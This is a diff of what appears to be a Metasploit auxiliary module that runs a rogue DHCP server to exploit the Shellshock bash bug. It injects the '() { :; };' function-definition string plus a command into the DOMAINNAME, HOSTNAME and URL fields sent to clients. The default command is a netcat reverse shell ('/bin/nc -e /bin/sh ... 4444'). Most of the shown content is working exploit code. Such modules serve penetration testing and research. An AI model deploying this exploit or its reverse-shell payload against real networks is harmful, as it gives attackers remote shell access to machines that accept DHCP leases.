@@ -46,34 +46,27 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('SRVHOST',     [ true, 'The IP of the DHCP server' ]),
-        OptString.new('NETMASK',     [ true, 'The netmask of the local subnet' ]),
-        OptString.new('DHCPIPSTART', [ false, 'The first IP to give out' ]),
-        OptString.new('DHCPIPEND',   [ false, 'The last IP to give out' ]),
-        OptString.new('ROUTER',      [ false, 'The router IP address' ]),
-        OptString.new('BROADCAST',   [ false, 'The broadcast address to send to' ]),
-        OptString.new('DNSSERVER',   [ false, 'The DNS server IP address' ]),
-        # OptString.new('HOSTNAME',    [ false, 'The optional hostname to assign' ]),
-        OptString.new('HOSTSTART',   [ false, 'The optional host integer counter' ]),
-        OptString.new('FILENAME',    [ false, 'The optional filename of a tftp boot server' ]),
-        OptString.new('CMD',         [ true, 'The command to run', '/bin/nc -e /bin/sh 127.0.0.1 4444'])
+        OptString.new('CMD', [ true, 'The command to run', '/bin/nc -e /bin/sh 127.0.0.1 4444'])
       ], self.class)
+
+    deregister_options('DOMAINNAME', 'HOSTNAME', 'URL')
   end
 
   def run
     value = "() { :; }; PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin #{datastore['CMD']}"
 
+    hash = datastore.copy
+    hash['DOMAINNAME'] = value
+    hash['HOSTNAME'] = value
+    hash['URL'] = value
+
     # This loop is required because the current DHCP Server exits after the
     # first interaction.
     loop do
       begin
-        start_service({
-          'HOSTNAME' => value,
-          'DOMAINNAME' => value,
-          'URL' => value
-        }.merge(datastore))
+        start_service(hash)
 
-        while dhcp.thread.alive?
+        while @dhcp.thread.alive?
           select(nil, nil, nil, 2)
         end
 
